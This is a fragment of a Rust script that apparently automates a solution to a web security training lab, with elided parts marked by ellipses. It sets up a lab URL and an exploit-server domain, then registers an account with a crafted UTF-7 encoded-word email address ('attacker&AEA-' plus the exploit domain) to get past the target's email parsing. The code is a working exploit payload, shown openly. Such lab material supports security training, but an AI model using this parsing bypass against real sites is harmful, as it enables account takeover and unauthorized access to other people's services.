...
const LAB_URL: &str = "https://0a8500cf04103b4b825f655a00b8008f.web-security-academy.net"; // Change this to your lab URL
const EXPLOIT_DOMAIN: &str = "exploit-0ace00ad04ab3b5d82d964130103002c.exploit-server.net"; // Change this to your exploit DOMAIN
...
fn main() {
    ...
    println!("{}", "OK".green());
    print!(
        "⦗3⦘ Registering a new account with your email embedded in encoded-word format to bypass email address parsing.. "
    );
    flush_terminal();
...
fn register_new_account(session: &str, csrf_token: &str) -> Response {
    let malicious_email = &format!("=?utf-7?q?attacker&AEA-{EXPLOIT_DOMAIN}&ACA-?=@ginandjuice.shop");
    WEB_CLIENT
